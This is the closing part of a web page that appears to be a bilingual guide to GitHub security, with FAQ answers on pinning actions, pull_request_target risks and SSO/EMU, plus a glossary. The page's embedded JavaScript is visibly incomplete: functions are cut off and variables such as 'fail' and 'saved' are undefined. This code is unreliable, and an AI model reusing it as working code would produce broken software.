  <details><summary>Why pin an action by SHA?</summary><p>A tag like <code>@v4</code> can be moved to malicious code; a full SHA designates immutable content.</p></details>
  <details><summary>What is the danger of <code>pull_request_target</code>?</summary><p>It runs with secrets and a write token even for a PR from a fork; running the PR's code in that context hands those accesses to an attacker.</p></details>
  <details><summary>What is the difference between SAML SSO and EMU?</summary><p>With SAML SSO, the person owns their account and goes through the IdP to access the organization. With EMU, accounts are created and deleted by the IdP: the company owns them.</p></details>
  <details><summary>Where should rights go: to a person or a team?</summary><p>To a team, ideally synchronized with an Entra ID group managed by the IGA.</p></details>
</section>

<section id="glossaire" data-group="Reference" data-title="Glossary">
  <div class="eyebrow">Reference</div>
  <h2>Glossary</h2>
  <dl class="kv">
    <dt>Branch</dt><dd>A movable label pointing to a commit.</dd>
    <dt>CODEOWNERS</dt><dd>File naming the mandatory reviewers per path.</dd>
    <dt>Commit</dt><dd>A recorded version of the project, identified by a SHA.</dd>
    <dt>Deploy key</dt><dd>An SSH key tied to a single repository.</dd>
    <dt>EMU</dt><dd>Enterprise Managed Users: accounts managed by the IdP.</dd>
    <dt>Environment</dt><dd>A deployment target with secrets and approval rules.</dd>
    <dt>Fork</dt><dd>A copy of a repository under another account.</dd>
    <dt>GitHub App</dt><dd>The reference machine identity on GitHub.</dd>
    <dt>GITHUB_TOKEN</dt><dd>The automatic token of a workflow run.</dd>
    <dt>IdP</dt><dd>Identity provider (Entra ID, Okta…).</dd>
    <dt>Merge</dt><dd>Merging two branches.</dd>
    <dt>OIDC</dt><dd>OpenID Connect: identity federation through signed tokens.</dd>
    <dt>PAT</dt><dd>Personal Access Token, classic or fine-grained.</dd>
    <dt>Pull request</dt><dd>A merge request with review and checks.</dd>
    <dt>Push protection</dt><dd>Blocks a push containing a secret.</dd>
    <dt>Rebase</dt><dd>Replaying commits onto another base.</dd>
    <dt>Ruleset</dt><dd>A set of protection rules for branches or tags.</dd>
    <dt>Runner</dt><dd>The machine running Actions jobs.</dd>
    <dt>SCIM</dt><dd>Protocol for automatic account provisioning.</dd>
    <dt>SHA</dt><dd>A commit's unique hash.</dd>
    <dt>SAML SSO</dt><dd>Authentication delegated to the IdP.</dd>
    <dt>Workflow</dt><dd>A GitHub Actions automation YAML file.</dd>
  </dl>
</section>

<script>
(function(){

          noLocal:"No match in this guide: use the cards above.", open:"Open ↗", min:"Type at least 2 characters." }
  };
  var lang, tr, sections = [], links = {}, io = null, index = [];

  function store(k, v){ try { localStorage.setItem(k, v); } catch(e){} }
  function load(k){ try { return localStorage.getItem(k); } catch(e){ return null; } }
  function norm(s){ return s.toLowerCase().normalize("NFD").replace(/[̀-ͯ]/g, ""); }
  function esc(s){ return String(s).replace(/[&<>"]/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); }

  /* ---------- langue ---------- */
  function initialLang(){

    if (saved === "fr" || saved === "en") return saved;
    return (navigator.language || "fr").toLowerCase().indexOf("fr") === 0 ? "fr" : "en";
  }
  function currentSectionId(){
    var best = sections.length ? sections[0].id : null;
    sections.forEach(function(s){ if (s.getBoundingClientRect().top <= 140) best = s.id; });
    return best;
  }
  function render(l, keepPlace){
    var anchor = keepPlace ? currentSectionId() : null;
    var panel = keepPlace ? ($$(".tab").filter(function(t){ return t.getAttribute("aria-selected") === "true"; })[0] || {}).dataset : null;
    lang = l; tr = T[l];
    var tpl = document.getElementById("tpl-" + l);
    app.innerHTML = "";
    app.appendChild(tpl.content.cloneNode(true));
    document.documentElement.lang = l;
    document.title = G.title[l];
    store("guides-lang", l);
    init(panel && panel.panel);
    if (anchor && $("#" + anchor) && (!panel || panel.panel === "guide")) { $("#" + anchor).scrollIntoView({ behavior: "instant", block: "start" }); }
  }

  /* ---------- initialisation d'une langue ---------- */
  function init(forcePanel){
    $$(".langsw button").forEach(function(b){
      b.setAttribute("aria-pressed", String(b.dataset.lang === lang));
      b.addEventListener("click", function(){ if (b.dataset.lang !== lang) render(b.dataset.lang, true); });
    });

    $$(".tab").forEach(function(t){ t.addEventListener("click", function(){ showPanel(t.dataset.panel); }); });
    var h = (location.hash || "").slice(1);
    if (forcePanel) showPanel(forcePanel, true);
    else if (h === "recherche" || h === "search") showPanel("search");
    else if (h === "aide-memoire" || h === "cheatsheet") showPanel("cheat");
    else { var saved = load(G.key + "-guide-tab"); if (saved && $("#panel-" + saved)) showPanel(saved, true); }

    /* sommaire */
    var toc = $("#toc"); toc.innerHTML = "";
    sections = $$("#doc section[data-title]"); links = {};
    var group = null;
    sections.forEach(function(s){
      if (s.dataset.group !== group){ group = s.dataset.group; var h4 = document.createElement("h4"); h4.textContent = group; toc.appendChild(h4); }
      var a = document.createElement("a"); a.href = "#" + s.id; a.textContent = s.dataset.title; toc.appendChild(a); links[s.id] = a;
      a.addEventListener("click", function(){ if (window.innerWidth <= 980) toc.classList.remove("open"); });
    });
    $("#tocToggle").addEventListener("click", function(){ showPanel("guide"); toc.classList.toggle("open"); });
    if (io) io.disconnect();
    if ("IntersectionObserver" in window){
      io = new IntersectionObserver(function(es){
        es.forEach(function(e){ if (e.isIntersecting){ Object.keys(links).forEach(function(k){ links[k].classList.remove("on"); }); if (links[e.target.id]) links[e.target.id].classList.add("on"); } });
      }, { rootMargin: "-20% 0px -70% 0px" });
      sections.forEach(function(s){ io.observe(s); });
    }

    /* copier */
    $$(".code").forEach(function(box){
      var pre = box.querySelector("pre"); if (!pre || box.querySelector(".copy")) return;
      var b = document.createElement("button"); b.type = "button"; b.className = "copy"; b.textContent = tr.copy;
      b.addEventListener("click", function(){
        var done = function(){ b.textContent = tr.copied; setTimeout(function(){ b.textContent = tr.copy; }, 1400); };

        try { navigator.clipboard.writeText(pre.innerText).then(done, fail); } catch(e){ fail(); }
      });
      box.appendChild(b);
    });

    /* index local */
    index = [];
    sections.forEach(function(s){
      $$("h2,h3,p,li,td,dt,dd,summary,pre", s).forEach(function(el){
        var t = el.textContent.replace(/\s+/g, " ").trim();

    });

    var q = $("#q"), hitsBox = $("#localHits");
    q.addEventListener("input", function(){

    /* recherche officielle */
    var ml = $("#modList"); ml.innerHTML = "";
    G.mods.forEach(function(m){ var a = document.createElement("a"); a.href = G.modUrl(m); a.target = "_blank"; a.rel = "noopener"; a.textContent = G.modLabel ? G.modLabel(m) : m; a.title = m; a.dataset.fq = m; ml.appendChild(a); });

  function showPanel(name, noScroll){

  }
  function search(q){
    var terms = norm(q).split(/\s+/).filter(function(x){ return x.length > 1; });
    if (!terms.length) return [];
    var res = [], seen = new Set();
    index.forEach(function(it){
      if (terms.every(function(t){ return it.low.indexOf(t) !== -1; })){
        var key = it.sec.id + "|" + it.text.slice(0, 60);
        if (seen.has(key)) return; seen.add(key);

    });
  }
  function goTo(el){
    showPanel("guide");
    $("#localHits").hidden = true;
    var d = el.closest("details"); if (d) d.open = true;

      el.scrollIntoView({ block: "center" });
      el.style.transition = "background .6s"; el.style.background = "var(--mark)";
      setTimeout(function(){ el.style.background = ""; }, 1600);
    }, 30);
  }
  function sendToOfficial(v){ $("#sq").value = v; updateOfficial(); showPanel("search"); }
  function updateOfficial(){
    var v = $("#sq").value.trim() || G.fallbackQuery;
    G.sources.forEach(function(s){ var a = $("#src-" + s.id); a.href = s.u(v); a.querySelector(".go").textContent = tr.open; });
    if (G.modCardLabel && $("#src-mod")) $("#src-mod .go").textContent = G.modCardLabel(v, lang);
    $("#goMain").href = G.sources[0].u(v);
    var t = norm(v), any = G.mods.some(function(m){ return norm(m).indexOf(t) !== -1; });
    $$("#modList a").forEach(function(a){ a.hidden = t.length > 1 && any && norm(a.dataset.fq).indexOf(t) === -1; });
    var box = $("#offLocal");
    if ($("#sq").value.trim().length < 2) box.innerHTML = '<p class="muted">' + tr.min + '</p>';
    else renderHits(box, v, '<p class="muted">' + tr.noLocal + '</p>');
  }

  /* écouteurs globaux (une seule fois) */
  window.addEventListener("scroll", function(){
    var bar = $("#progress"); if (!bar) return;
    var d = document.documentElement, max = d.scrollHeight - d.clientHeight;
    bar.style.width = (max > 0 ? (d.scrollTop / max * 100) : 0) + "%";
  }, { passive: true });

  render(initialLang(), false);
})();

</script>
</body></html>
